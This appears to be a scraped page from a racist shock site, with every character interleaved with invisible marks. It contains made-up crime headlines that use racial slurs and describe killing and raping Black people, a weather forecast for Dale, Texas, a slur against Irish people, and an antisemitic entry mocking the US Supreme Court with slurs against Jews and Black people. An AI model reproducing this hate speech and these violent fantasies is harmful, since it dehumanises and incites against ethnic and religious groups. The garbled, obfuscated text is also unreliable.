S‚Äép‚Äéi‚Äéc‚Äé ‚ÄéT‚Äéh‚Äér‚Äéo‚Äéw‚Äés‚Äé ‚ÄéC‚Äéa‚Äét‚Äé ‚Äéo‚Äéf‚Äéf‚Äé ‚ÄéB‚Äéa‚Äél‚Äéc‚Äéo‚Äén‚Äéy‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚ÄéT‚Äéh‚Äée‚Äén‚Äé ‚ÄéS‚Äét‚Äéo‚Äém‚Äép‚Äés‚Äé ‚Äéi‚Äét‚Äé ‚Äét‚Äéo‚Äé ‚ÄéD‚Äée‚Äéa‚Äét‚Äéh‚Äé ‚ÄéB‚Äée‚Äéf‚Äéo‚Äér‚Äée‚Äé ‚ÄéT‚Äér‚Äéy‚Äéi‚Äén‚Äég‚Äé ‚Äét‚Äéo‚Äé ‚ÄéS‚Äéh‚Äéo‚Äéw‚Äé ‚ÄéH‚Äéi‚Äés‚Äé ‚ÄéA‚Äés‚Äés‚Äé ‚Äét‚Äéo‚Äé ‚ÄéC‚Äéo‚Äép‚Äés‚Äé.‚Äé

H‚Äéo‚Äéw‚Äé ‚Äéa‚Äéb‚Äéo‚Äéu‚Äét‚Äé ‚ÄéI‚Äé ‚Äét‚Äéh‚Äér‚Äéo‚Äéw‚Äé ‚Äéh‚Äéi‚Äés‚Äé ‚Äém‚Äéo‚Äét‚Äéh‚Äée‚Äér‚Äé ‚Äéo‚Äéf‚Äéf‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéb‚Äéa‚Äél‚Äéc‚Äéo‚Äén‚Äéy‚Äé,‚Äé ‚Äér‚Äéa‚Äép‚Äée‚Äé ‚Äéh‚Äée‚Äér‚Äé,‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äét‚Äéh‚Äée‚Äén‚Äé ‚Äés‚Äét‚Äéo‚Äém‚Äép‚Äé ‚Äéh‚Äée‚Äér‚Äé ‚Äét‚Äéo‚Äé ‚Äéd‚Äée‚Äéa‚Äét‚Äéh‚Äé,‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äét‚Äéh‚Äée‚Äén‚Äé ‚Äés‚Äéh‚Äéo‚Äéw‚Äé ‚Äém‚Äéy‚Äé ‚Äéa‚Äés‚Äés‚Äé ‚Äét‚Äéo‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚ÄéS‚ÄéP‚ÄéL‚ÄéC‚Äé.‚Äé


C‚Äéh‚Äéi‚Äén‚Äék‚Äé ‚ÄéW‚Äéh‚Äéo‚Äé ‚ÄéK‚Äéi‚Äél‚Äél‚Äée‚Äéd‚Äé ‚ÄéW‚Äéh‚Äéi‚Äét‚Äée‚Äé ‚ÄéM‚Äée‚Äém‚Äép‚Äéh‚Äéi‚Äés‚Äé ‚ÄéC‚Äéo‚Äél‚Äél‚Äée‚Äég‚Äée‚Äé ‚ÄéS‚Äét‚Äéu‚Äéd‚Äée‚Äén‚Äét‚Äé ‚ÄéF‚Äér‚Äée‚Äée‚Äéd‚Äé ‚Äéo‚Äén‚Äé ‚ÄéB‚Äéo‚Äén‚Äéd‚Äé ‚ÄéA‚Äéf‚Äét‚Äée‚Äér‚Äé ‚ÄéG‚Äée‚Äét‚Äét‚Äéi‚Äén‚Äég‚Äé ‚Äé1‚Äé5‚Äé ‚ÄéY‚Äée‚Äéa‚Äér‚Äé ‚ÄéS‚Äée‚Äén‚Äét‚Äée‚Äén‚Äéc‚Äée‚Äé.‚Äé


N‚Äée‚Äég‚Äér‚Äée‚Äés‚Äés‚Äé ‚ÄéL‚Äée‚Äéz‚Äéb‚Äéo‚Äé ‚Äéo‚Äén‚Äé ‚ÄéP‚Äéa‚Äéi‚Äéd‚Äé ‚ÄéL‚Äée‚Äéa‚Äév‚Äée‚Äé ‚ÄéA‚Äéf‚Äét‚Äée‚Äér‚Äé ‚ÄéG‚Äér‚Äéa‚Äéb‚Äéb‚Äéi‚Äén‚Äég‚Äé ‚ÄéD‚ÄéC‚Äé ‚ÄéE‚Äél‚Äée‚Äém‚Äée‚Äén‚Äét‚Äéa‚Äér‚Äéy‚Äé ‚ÄéS‚Äéc‚Äéh‚Äéo‚Äéo‚Äél‚Äé ‚ÄéT‚Äée‚Äéa‚Äéc‚Äéh‚Äée‚Äér‚Äé'‚Äés‚Äé ‚ÄéA‚Äés‚Äés‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚ÄéT‚Äér‚Äéy‚Äéi‚Äén‚Äég‚Äé ‚Äét‚Äéo‚Äé ‚ÄéS‚Äéh‚Äéo‚Äév‚Äée‚Äé ‚ÄéF‚Äéi‚Äén‚Äég‚Äée‚Äér‚Äés‚Äé ‚ÄéU‚Äép‚Äé ‚ÄéH‚Äée‚Äér‚Äé ‚ÄéC‚Äéu‚Äén‚Äét‚Äé.‚Äé


B‚Äér‚Äéo‚Äén‚Äéx‚Äé ‚ÄéN‚ÄéW‚Äéo‚Äér‚Äéd‚Äé ‚ÄéS‚Äél‚Äéa‚Äés‚Äéh‚Äée‚Äés‚Äé ‚Äéa‚Äé ‚ÄéB‚Äéu‚Äén‚Äéc‚Äéh‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéP‚Äée‚Äéo‚Äép‚Äél‚Äée‚Äé ‚Äéo‚Äén‚Äé ‚ÄéB‚Äér‚Äéo‚Äén‚Äéx‚Äé ‚ÄéS‚Äéi‚Äéd‚Äée‚Äéw‚Äéa‚Äél‚Äék‚Äé.‚Äé

.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé ‚ÄéW‚Äée‚Äéa‚Äét‚Äéh‚Äée‚Äér‚Äé.‚Äé

 ‚Äé
1‚Äé0‚Äé ‚ÄéD‚Äéa‚Äéy‚Äé ‚ÄéW‚Äée‚Äéa‚Äét‚Äéh‚Äée‚Äér‚Äé-‚ÄéD‚Äéa‚Äél‚Äée‚Äé,‚Äé ‚ÄéT‚ÄéX‚Äé
A‚Äés‚Äé ‚Äéo‚Äéf‚Äé ‚Äé7‚Äé:‚Äé4‚Äé4‚Äé ‚Äéa‚Äém‚Äé ‚ÄéC‚ÄéD‚ÄéT‚Äé
T‚Äéh‚Äée‚Äér‚Äée‚Äé ‚Äéi‚Äés‚Äé ‚Äéa‚Äé ‚Äém‚Äéa‚Äér‚Äég‚Äéi‚Äén‚Äéa‚Äél‚Äé ‚Äér‚Äéi‚Äés‚Äék‚Äé ‚Äéo‚Äéf‚Äé ‚Äés‚Äée‚Äév‚Äée‚Äér‚Äée‚Äé ‚Äéw‚Äée‚Äéa‚Äét‚Äéh‚Äée‚Äér‚Äé ‚Äét‚Äéo‚Äéd‚Äéa‚Äéy‚Äé.‚Äé
 ‚Äé
T‚Äéo‚Äéd‚Äéa‚Äéy‚Äé
P‚ÄéM‚Äé ‚ÄéT‚Äéh‚Äéu‚Äén‚Äéd‚Äée‚Äér‚Äés‚Äét‚Äéo‚Äér‚Äém‚Äés‚Äé
7‚Äé0‚Äé¬∞‚Äé
/‚Äé6‚Äé1‚Äé¬∞‚Äé
7‚Äé3‚Äé%‚Äé
N‚ÄéN‚ÄéE‚Äé ‚Äé8‚Äé ‚Äém‚Äép‚Äéh‚Äé
S‚Äéa‚Äét‚Äé ‚Äé1‚Äé6‚Äé ‚Äé|‚Äé ‚ÄéD‚Äéa‚Äéy‚Äé
7‚Äé0‚Äé¬∞‚Äé
7‚Äé3‚Äé%‚Äé
N‚ÄéN‚ÄéE‚Äé
8‚Äé
 ‚Äé
m‚Äép‚Äéh‚Äé
C‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé ‚Äée‚Äéa‚Äér‚Äél‚Äéy‚Äé,‚Äé ‚Äét‚Äéh‚Äée‚Äén‚Äé ‚Äét‚Äéh‚Äéu‚Äén‚Äéd‚Äée‚Äér‚Äés‚Äét‚Äéo‚Äér‚Äém‚Äés‚Äé ‚Äéd‚Äée‚Äév‚Äée‚Äél‚Äéo‚Äép‚Äéi‚Äén‚Äég‚Äé ‚Äét‚Äéh‚Äéi‚Äés‚Äé ‚Äéa‚Äéf‚Äét‚Äée‚Äér‚Äén‚Äéo‚Äéo‚Äén‚Äé.‚Äé ‚ÄéP‚Äéo‚Äét‚Äée‚Äén‚Äét‚Äéi‚Äéa‚Äél‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚Äés‚Äée‚Äév‚Äée‚Äér‚Äée‚Äé ‚Äét‚Äéh‚Äéu‚Äén‚Äéd‚Äée‚Äér‚Äés‚Äét‚Äéo‚Äér‚Äém‚Äés‚Äé.‚Äé ‚ÄéH‚Äéi‚Äég‚Äéh‚Äé ‚Äén‚Äée‚Äéa‚Äér‚Äé ‚Äé7‚Äé0‚ÄéF‚Äé.‚Äé ‚ÄéW‚Äéi‚Äén‚Äéd‚Äés‚Äé ‚ÄéN‚ÄéN‚ÄéE‚Äé ‚Äéa‚Äét‚Äé ‚Äé5‚Äé ‚Äét‚Äéo‚Äé ‚Äé1‚Äé0‚Äé ‚Äém‚Äép‚Äéh‚Äé.‚Äé ‚ÄéC‚Äéh‚Äéa‚Äén‚Äéc‚Äée‚Äé ‚Äéo‚Äéf‚Äé ‚Äér‚Äéa‚Äéi‚Äén‚Äé ‚Äé7‚Äé0‚Äé%‚Äé.‚Äé
 ‚Äé
H‚Äéu‚Äém‚Äéi‚Äéd‚Äéi‚Äét‚Äéy‚Äé
9‚Äé3‚Äé%‚Äé
U‚ÄéV‚Äé ‚ÄéI‚Äén‚Äéd‚Äée‚Äéx‚Äé
4‚Äé ‚Äéo‚Äéf‚Äé ‚Äé1‚Äé1‚Äé
S‚Äéu‚Äén‚Äér‚Äéi‚Äés‚Äée‚Äé
7‚Äé:‚Äé3‚Äé7‚Äé ‚Äéa‚Äém‚Äé
S‚Äéu‚Äén‚Äés‚Äée‚Äét‚Äé
7‚Äé:‚Äé3‚Äé9‚Äé ‚Äép‚Äém‚Äé
S‚Äéa‚Äét‚Äé ‚Äé1‚Äé6‚Äé ‚Äé|‚Äé ‚ÄéN‚Äéi‚Äég‚Äéh‚Äét‚Äé
6‚Äé1‚Äé¬∞‚Äé
9‚Äé4‚Äé%‚Äé
N‚ÄéN‚ÄéE‚Äé
8‚Äé
 ‚Äé
m‚Äép‚Äéh‚Äé
T‚Äéh‚Äéu‚Äén‚Äéd‚Äée‚Äér‚Äés‚Äét‚Äéo‚Äér‚Äém‚Äés‚Äé ‚Äél‚Äéi‚Äék‚Äée‚Äél‚Äéy‚Äé.‚Äé ‚ÄéP‚Äéo‚Äét‚Äée‚Äén‚Äét‚Äéi‚Äéa‚Äél‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚Äés‚Äée‚Äév‚Äée‚Äér‚Äée‚Äé ‚Äét‚Äéh‚Äéu‚Äén‚Äéd‚Äée‚Äér‚Äés‚Äét‚Äéo‚Äér‚Äém‚Äés‚Äé.‚Äé ‚ÄéL‚Äéo‚Äéw‚Äé ‚Äé6‚Äé1‚ÄéF‚Äé.‚Äé ‚ÄéW‚Äéi‚Äén‚Äéd‚Äés‚Äé ‚ÄéN‚ÄéN‚ÄéE‚Äé ‚Äéa‚Äét‚Äé ‚Äé5‚Äé ‚Äét‚Äéo‚Äé ‚Äé1‚Äé0‚Äé ‚Äém‚Äép‚Äéh‚Äé.‚Äé ‚ÄéC‚Äéh‚Äéa‚Äén‚Äéc‚Äée‚Äé ‚Äéo‚Äéf‚Äé ‚Äér‚Äéa‚Äéi‚Äén‚Äé ‚Äé9‚Äé0‚Äé%‚Äé.‚Äé
 ‚Äé
H‚Äéu‚Äém‚Äéi‚Äéd‚Äéi‚Äét‚Äéy‚Äé
9‚Äé6‚Äé%‚Äé
U‚ÄéV‚Äé ‚ÄéI‚Äén‚Äéd‚Äée‚Äéx‚Äé
0‚Äé ‚Äéo‚Äéf‚Äé ‚Äé1‚Äé1‚Äé
M‚Äéo‚Äéo‚Äén‚Äér‚Äéi‚Äés‚Äée‚Äé
1‚Äé2‚Äé:‚Äé0‚Äé0‚Äé ‚Äép‚Äém‚Äé
F‚Äéi‚Äér‚Äés‚Äét‚Äé ‚ÄéQ‚Äéu‚Äéa‚Äér‚Äét‚Äée‚Äér‚Äé
M‚Äéo‚Äéo‚Äén‚Äés‚Äée‚Äét‚Äé
1‚Äé:‚Äé5‚Äé5‚Äé ‚Äéa‚Äém‚Äé
S‚Äéu‚Äén‚Äé ‚Äé1‚Äé7‚Äé
S‚Äéh‚Äéo‚Äéw‚Äée‚Äér‚Äés‚Äé
6‚Äé7‚Äé¬∞‚Äé
/‚Äé5‚Äé1‚Äé¬∞‚Äé
6‚Äé2‚Äé%‚Äé
N‚ÄéN‚ÄéE‚Äé ‚Äé1‚Äé4‚Äé ‚Äém‚Äép‚Äéh‚Äé
M‚Äéo‚Äén‚Äé ‚Äé1‚Äé8‚Äé
P‚Äéa‚Äér‚Äét‚Äél‚Äéy‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
6‚Äé7‚Äé¬∞‚Äé
/‚Äé4‚Äé5‚Äé¬∞‚Äé
4‚Äé%‚Äé
N‚ÄéN‚ÄéE‚Äé ‚Äé1‚Äé6‚Äé ‚Äém‚Äép‚Äéh‚Äé
T‚Äéu‚Äée‚Äé ‚Äé1‚Äé9‚Äé
M‚Äéo‚Äés‚Äét‚Äél‚Äéy‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
6‚Äé2‚Äé¬∞‚Äé
/‚Äé4‚Äé8‚Äé¬∞‚Äé
1‚Äé6‚Äé%‚Äé
E‚ÄéS‚ÄéE‚Äé ‚Äé6‚Äé ‚Äém‚Äép‚Äéh‚Äé
W‚Äée‚Äéd‚Äé ‚Äé2‚Äé0‚Äé
P‚ÄéM‚Äé ‚ÄéS‚Äéh‚Äéo‚Äéw‚Äée‚Äér‚Äés‚Äé
6‚Äé7‚Äé¬∞‚Äé
/‚Äé5‚Äé9‚Äé¬∞‚Äé
4‚Äé6‚Äé%‚Äé
S‚ÄéS‚ÄéE‚Äé ‚Äé9‚Äé ‚Äém‚Äép‚Äéh‚Äé
T‚Äéh‚Äéu‚Äé ‚Äé2‚Äé1‚Äé
S‚Äéc‚Äéa‚Äét‚Äét‚Äée‚Äér‚Äée‚Äéd‚Äé ‚ÄéT‚Äéh‚Äéu‚Äén‚Äéd‚Äée‚Äér‚Äés‚Äét‚Äéo‚Äér‚Äém‚Äés‚Äé
7‚Äé7‚Äé¬∞‚Äé
/‚Äé5‚Äé7‚Äé¬∞‚Äé
5‚Äé1‚Äé%‚Äé
S‚ÄéW‚Äé ‚Äé8‚Äé ‚Äém‚Äép‚Äéh‚Äé
F‚Äér‚Äéi‚Äé ‚Äé2‚Äé2‚Äé
M‚Äéo‚Äés‚Äét‚Äél‚Äéy‚Äé ‚ÄéS‚Äéu‚Äén‚Äén‚Äéy‚Äé
7‚Äé9‚Äé¬∞‚Äé
/‚Äé5‚Äé6‚Äé¬∞‚Äé
1‚Äé7‚Äé%‚Äé
W‚ÄéN‚ÄéW‚Äé ‚Äé9‚Äé ‚Äém‚Äép‚Äéh‚Äé
S‚Äéa‚Äét‚Äé ‚Äé2‚Äé3‚Äé
P‚Äéa‚Äér‚Äét‚Äél‚Äéy‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
8‚Äé0‚Äé¬∞‚Äé
/‚Äé6‚Äé0‚Äé¬∞‚Äé
2‚Äé4‚Äé%‚Äé
S‚ÄéE‚Äé ‚Äé9‚Äé ‚Äém‚Äép‚Äéh‚Äé
S‚Äéu‚Äén‚Äé ‚Äé2‚Äé4‚Äé
M‚Äéo‚Äés‚Äét‚Äél‚Äéy‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
7‚Äé9‚Äé¬∞‚Äé
/‚Äé6‚Äé2‚Äé¬∞‚Äé
1‚Äé3‚Äé%‚Äé
S‚Äé ‚Äé1‚Äé5‚Äé ‚Äém‚Äép‚Äéh‚Äé
M‚Äéo‚Äén‚Äé ‚Äé2‚Äé5‚Äé
A‚ÄéM‚Äé ‚ÄéS‚Äéh‚Äéo‚Äéw‚Äée‚Äér‚Äés‚Äé
7‚Äé8‚Äé¬∞‚Äé
/‚Äé5‚Äé6‚Äé¬∞‚Äé
4‚Äé9‚Äé%‚Äé
S‚ÄéW‚Äé ‚Äé1‚Äé4‚Äé ‚Äém‚Äép‚Äéh‚Äé
T‚Äéu‚Äée‚Äé ‚Äé2‚Äé6‚Äé
P‚Äéa‚Äér‚Äét‚Äél‚Äéy‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
7‚Äé9‚Äé¬∞‚Äé
/‚Äé5‚Äé5‚Äé¬∞‚Äé
1‚Äé2‚Äé%‚Äé
W‚Äé ‚Äé1‚Äé2‚Äé ‚Äém‚Äép‚Äéh‚Äé
W‚Äée‚Äéd‚Äé ‚Äé2‚Äé7‚Äé
S‚Äéu‚Äén‚Äén‚Äéy‚Äé
7‚Äé8‚Äé¬∞‚Äé
/‚Äé5‚Äé2‚Äé¬∞‚Äé
2‚Äé%‚Äé
N‚ÄéN‚ÄéW‚Äé ‚Äé1‚Äé3‚Äé ‚Äém‚Äép‚Äéh‚Äé
T‚Äéh‚Äéu‚Äé ‚Äé2‚Äé8‚Äé
M‚Äéo‚Äés‚Äét‚Äél‚Äéy‚Äé ‚ÄéS‚Äéu‚Äén‚Äén‚Äéy‚Äé
7‚Äé7‚Äé¬∞‚Äé
/‚Äé5‚Äé6‚Äé¬∞‚Äé
1‚Äé1‚Äé%‚Äé
S‚ÄéE‚Äé ‚Äé1‚Äé2‚Äé ‚Äém‚Äép‚Äéh‚Äé
F‚Äér‚Äéi‚Äé ‚Äé2‚Äé9‚Äé
P‚Äéa‚Äér‚Äét‚Äél‚Äéy‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
7‚Äé9‚Äé¬∞‚Äé
/‚Äé5‚Äé5‚Äé¬∞‚Äé
4‚Äé%‚Äé
S‚ÄéE‚Äé ‚Äé1‚Äé2‚Äé ‚Äém‚Äép‚Äéh‚Äé
S‚Äéa‚Äét‚Äé ‚Äé3‚Äé0‚Äé
P‚Äéa‚Äér‚Äét‚Äél‚Äéy‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
7‚Äé8‚Äé¬∞‚Äé
/‚Äé5‚Äé9‚Äé¬∞‚Äé
2‚Äé0‚Äé%‚Äé
E‚Äé ‚Äé1‚Äé2‚Äé ‚Äém‚Äép‚Äéh‚Äé

.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé

C‚Äéu‚Äér‚Äér‚Äée‚Äén‚Äét‚Äé ‚Äét‚Äéh‚Äér‚Äée‚Äéa‚Äét‚Äé:‚Äé ‚ÄéD‚Äér‚Äéu‚Äén‚Äék‚Äé ‚ÄéI‚Äér‚Äéi‚Äés‚Äéh‚Äé ‚Äép‚Äée‚Äéo‚Äép‚Äél‚Äée‚Äé.‚Äé ‚ÄéüçÄ

.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé

S‚Äéu‚Äép‚Äér‚Äée‚Äém‚Äée‚Äé_‚ÄéC‚Äéo‚Äéu‚Äér‚Äét‚Äé
T‚Äéa‚Äéx‚Äée‚Äés‚Äé ‚ÄéT‚Äéh‚Äée‚Äé ‚ÄéS‚Äéu‚Äép‚Äér‚Äée‚Äém‚Äée‚Äé ‚ÄéC‚Äéo‚Äéu‚Äér‚Äét‚Äé ‚Äéo‚Äéf‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚ÄéJ‚Äée‚Äéw‚Äén‚Äéi‚Äét‚Äée‚Äéd‚Äé ‚ÄéS‚Äét‚Äéa‚Äét‚Äée‚Äés‚Äé ‚Äé(‚Äéc‚Äéo‚Äém‚Äém‚Äéo‚Äén‚Äél‚Äéy‚Äé ‚Äéa‚Äéb‚Äéb‚Äér‚Äée‚Äév‚Äéi‚Äéa‚Äét‚Äée‚Äéd‚Äé ‚Äéa‚Äés‚Äé ‚ÄéS‚ÄéC‚ÄéR‚ÄéO‚ÄéT‚ÄéU‚ÄéS‚Äé)‚Äé ‚Äéa‚Äér‚Äée‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äén‚Äéi‚Äén‚Äée‚Äé ‚Äék‚Äéi‚Äén‚Äég‚Äés‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéq‚Äéu‚Äée‚Äée‚Äén‚Äés‚Äé ‚Äét‚Äéh‚Äéa‚Äét‚Äé ‚Äér‚Äéu‚Äél‚Äée‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚ÄéU‚Äén‚Äéi‚Äét‚Äée‚Äéd‚Äé ‚ÄéS‚Äét‚Äéa‚Äét‚Äée‚Äés‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéA‚Äém‚Äée‚Äér‚Äéi‚Äéf‚Äéa‚Äét‚Äé,‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéa‚Äél‚Äél‚Äé ‚Äéo‚Äéf‚Äé ‚Äét‚Äéh‚Äée‚Äém‚Äé ‚Äéa‚Äér‚Äée‚Äé ‚Äéa‚Äéb‚Äéo‚Äév‚Äée‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äél‚Äéa‚Äéw‚Äé,‚Äé ‚Äém‚Äée‚Äéa‚Äén‚Äéi‚Äén‚Äég‚Äé ‚Äén‚Äéi‚Äég‚Äég‚Äée‚Äér‚Äés‚Äé ‚Äép‚Äéu‚Äét‚Äét‚Äéi‚Äén‚Äég‚Äé ‚Äép‚Äéu‚Äéb‚Äéi‚Äéc‚Äé ‚Äéh‚Äéa‚Äéi‚Äér‚Äé ‚Äéo‚Äén‚Äé ‚ÄéA‚Äén‚Äéi‚Äét‚Äéa‚Äé ‚ÄéH‚Äéi‚Äél‚Äél‚Äé'‚Äés‚Äé ‚Äéc‚Äéo‚Äék‚Äée‚Äé ‚Äéc‚Äéa‚Äén‚Äé ‚Äéi‚Äés‚Äé ‚Äéo‚Äék‚Äéa‚Äéy‚Äé.‚Äé ‚ÄéM‚Äéo‚Äér‚Äée‚Äé ‚Äés‚Äép‚Äée‚Äéc‚Äéi‚Äéf‚Äéi‚Äéc‚Äéa‚Äél‚Äél‚Äéy‚Äé,‚Äé ‚Äéf‚Äéi‚Äév‚Äée‚Äé ‚Äék‚Äéi‚Äén‚Äég‚Äés‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéq‚Äéu‚Äée‚Äée‚Äén‚Äés‚Äé ‚Äér‚Äéu‚Äél‚Äée‚Äé ‚Äét‚Äéh‚Äéa‚Äét‚Äé ‚Äéo‚Äéb‚Äée‚Äés‚Äée‚Äé ‚Äén‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äé,‚Äé ‚Äés‚Äéi‚Äén‚Äéc‚Äée‚Äé ‚Äée‚Äév‚Äée‚Äér‚Äéy‚Äé ‚Äép‚Äél‚Äéa‚Äéy‚Äée‚Äér‚Äé ‚Äéo‚Äén‚Äé ‚ÄéS‚Äéu‚Äér‚Äév‚Äéi‚Äév‚Äéo‚Äér‚Äé ‚Äék‚Äén‚Äéo‚Äéw‚Äés‚Äé ‚Äéy‚Äéo‚Äéu‚Äé ‚Äén‚Äée‚Äée‚Äéd‚Äé ‚Äéa‚Äé ‚Äés‚Äéo‚Äél‚Äéi‚Äéd‚Äé ‚Äéf‚Äéi‚Äév‚Äée‚Äé ‚Äét‚Äéo‚Äé ‚Äéw‚Äéi‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äég‚Äéa‚Äém‚Äée‚Äé.‚Äé ‚ÄéI‚Äén‚Äé ‚Äét‚Äér‚Äéu‚Äée‚Äé ‚Äéd‚Äée‚Äém‚Äéo‚Äéc‚Äér‚Äéa‚Äét‚Äéi‚Äéc‚Äé ‚Äéf‚Äéa‚Äés‚Äéh‚Äéi‚Äéo‚Äén‚Äé,‚Äé ‚Äéa‚Äé ‚Äés‚Äéi‚Äén‚Äég‚Äél‚Äée‚Äé ‚Äés‚Äéw‚Äéi‚Äén‚Äég‚Äé ‚Äév‚Äéo‚Äét‚Äée‚Äé ‚Äéo‚Äér‚Äé ‚Äép‚Äéh‚Äéi‚Äél‚Äéo‚Äés‚Äéo‚Äép‚Äéh‚Äée‚Äér‚Äé ‚Äék‚Äéi‚Äén‚Äég‚Äé ‚Äéi‚Äés‚Äé ‚Äéa‚Äél‚Äél‚Äé ‚Äét‚Äéh‚Äéa‚Äét‚Äé'‚Äés‚Äé ‚Äén‚Äée‚Äée‚Äéd‚Äée‚Äéd‚Äé ‚Äét‚Äéo‚Äé ‚Äéc‚Äér‚Äée‚Äéa‚Äét‚Äée‚Äé ‚Äéo‚Äér‚Äé ‚Äéd‚Äée‚Äés‚Äét‚Äér‚Äéo‚Äéy‚Äé ‚Äés‚Äéh‚Äéi‚Äét‚Äé.‚Äé ‚ÄéT‚Äéh‚Äéi‚Äés‚Äé ‚Äég‚Äéi‚Äév‚Äée‚Äés‚Äé ‚ÄéS‚ÄéC‚ÄéR‚ÄéO‚ÄéT‚ÄéU‚ÄéS‚Äé ‚Äéa‚Äéc‚Äét‚Äéu‚Äéa‚Äél‚Äé ‚Äép‚Äéo‚Äéw‚Äée‚Äér‚Äé,‚Äé ‚Äéu‚Äén‚Äél‚Äéi‚Äék‚Äée‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéc‚Äéa‚Äér‚Äéd‚Äéb‚Äéo‚Äéa‚Äér‚Äéd‚Äé ‚Äéc‚Äéu‚Äét‚Äéo‚Äéu‚Äét‚Äés‚Äé ‚Äét‚Äéh‚Äéa‚Äét‚Äé ‚Äép‚Äéu‚Äéd‚Äéd‚Äél‚Äée‚Äé-‚Äés‚Äéh‚Äéa‚Äép‚Äée‚Äéd‚Äé ‚ÄéA‚Äém‚Äée‚Äér‚Äéi‚Äéc‚Äéa‚Äén‚Äés‚Äé ‚Äév‚Äéo‚Äét‚Äée‚Äé ‚Äéf‚Äéo‚Äér‚Äé.‚Äé ‚ÄéO‚Äér‚Äéi‚Äég‚Äéi‚Äén‚Äéa‚Äél‚Äél‚Äéy‚Äé ‚Äée‚Äén‚Äév‚Äéi‚Äés‚Äéi‚Äéo‚Äén‚Äée‚Äéd‚Äé ‚Äéb‚Äéy‚Äé ‚Äés‚Äél‚Äéa‚Äév‚Äée‚Äé-‚Äéo‚Äéw‚Äén‚Äée‚Äér‚Äés‚Äé ‚Äéa‚Äés‚Äé ‚Äéa‚Äé ‚Äéf‚Äéo‚Äér‚Äém‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéI‚ÄéR‚ÄéL‚Äé ‚ÄéI‚Äén‚Äét‚Äée‚Äér‚Äén‚Äée‚Äét‚Äé ‚Äéc‚Äéo‚Äéu‚Äér‚Äét‚Äé,‚Äé ‚ÄéS‚ÄéC‚ÄéR‚ÄéO‚ÄéT‚ÄéU‚ÄéS‚Äé ‚Äéh‚Äéa‚Äés‚Äé ‚Äéb‚Äée‚Äéc‚Äéo‚Äém‚Äée‚Äé ‚Äél‚Äéi‚Äék‚Äée‚Äé ‚Äéa‚Äé ‚ÄéM‚Äéa‚Äég‚Äéi‚Äéc‚Äé ‚Äéc‚Äéa‚Äér‚Äéd‚Äé ‚Äér‚Äéu‚Äén‚Äé ‚Äéa‚Äém‚Äéo‚Äék‚Äé,‚Äé ‚Äél‚Äée‚Äéa‚Äéd‚Äéi‚Äén‚Äég‚Äé ‚Äét‚Äéo‚Äé ‚Äéu‚Äén‚Äéf‚Äéo‚Äér‚Äée‚Äés‚Äée‚Äée‚Äén‚Äé ‚Äéc‚Äéo‚Äén‚Äés‚Äée‚Äéq‚Äéu‚Äée‚Äén‚Äéc‚Äée‚Äés‚Äé ‚Äéi‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äér‚Äéu‚Äél‚Äée‚Äéb‚Äéo‚Äéo‚Äék‚Äé,‚Äé ‚Äés‚Äéu‚Äéc‚Äéh‚Äé ‚Äéa‚Äés‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äép‚Äéo‚Äél‚Äéi‚Äét‚Äéi‚Äéc‚Äéa‚Äél‚Äé ‚Äér‚Äée‚Äéa‚Äél‚Äéi‚Äéz‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéP‚Äél‚Äéa‚Äét‚Äéo‚Äé'‚Äés‚Äé ‚ÄéP‚Äéh‚Äéi‚Äél‚Äéo‚Äés‚Äéo‚Äép‚Äéh‚Äée‚Äér‚Äé ‚ÄéK‚Äéi‚Äén‚Äég‚Äé ‚Äéc‚Äéo‚Äén‚Äéc‚Äée‚Äép‚Äét‚Äé.‚Äé

